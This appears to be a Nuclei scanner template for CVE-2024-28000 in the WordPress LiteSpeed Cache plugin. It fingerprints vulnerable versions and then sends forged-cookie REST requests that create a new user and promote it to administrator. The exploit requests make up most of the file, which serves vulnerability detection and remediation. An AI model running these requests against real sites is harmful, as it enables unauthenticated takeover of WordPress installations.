flow: http(1) || (http(2) && http(3))
http:
- extractors:
  - group: 1
    name: version
    part: body
    regex:
    - 'Stable tag: ([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, 'LiteSpeed Cache')
    - compare_versions(version, '<= 6.3.0.1')
    type: dsl
  raw:
  - 'GET /wp-content/plugins/litespeed-cache/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - internal: true
    json:
    - .id
    name: user_id
    type: json
  matchers:
  - condition: and
    dsl:
    - status_code == 201
    - contains(content_type, "application/json")
    - contains_all(body, "first_name","username")
    internal: true
    type: dsl
  raw:
  - "POST /wp-json/wp/v2/users HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    Cookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}\n\n{\n  \"username\"\
    : \"{{username}}\",\n  \"password\": \"{{password}}\",\n  \"email\": \"{{email}}\"\
    \n}\n"
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "administrator","registered_date")
    type: dsl
  raw:
  - "PUT /wp-json/wp/v2/users/{{user_id}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nCookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}\n\
    \n{\n  \"roles\": [\"administrator\"]\n}\n"
id: CVE-2024-28000
info:
  author: melmathari
  classification:
    cpe: cpe:2.3:a:litespeedtech:litespeed_cache:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-28000
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-266,NVD-CWE-Other
    epss-percentile: 0.99494
    epss-score: 0.88847
  description: 'Incorrect Privilege Assignment vulnerability in LiteSpeed Technologies
    LiteSpeed Cache litespeed-cache allows Privilege Escalation.This issue affects
    LiteSpeed Cache: from 1.9 through 6.3.0.1.

    '
  impact: 'Unauthenticated attackers can escalate privileges to administrator level,
    gaining full control of the WordPress site.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: litespeed_cache
    publicwww-query: /wp-content/plugins/litespeed-cache/
    vendor: litespeedtech
    verified: true
  name: WordPress LiteSpeed Cache - Unauthenticated Privilege Escalation to Admin
  reference:
  - https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-3-0-1-unauthenticated-privilege-escalation-vulnerability?_s_id=cve
  - https://www.exploit-db.com/exploits/52328
  - https://nvd.nist.gov/vuln/detail/CVE-2024-28000
  - https://vulncheck.com/xdb/6f169f41e032
  - https://blog.securelayer7.net/cve-2024-28000-litespeed-cache-plugin/
  remediation: 'Update LiteSpeed Cache plugin to a patched version addressing CVE-2024-28000.

    '
  severity: critical
  tags: cve,cve2024,wordpress,wp,wp-plugin,litespeed-cache,priv-esc,intrusive,vkev,vuln
variables:
  email: '{{rand_base(8)}}@{{rand_base(5)}}.com'
  password: '{{rand_text_alphanumeric(12)}}!'
  username: '{{to_lower(rand_text_alpha(5))}}'
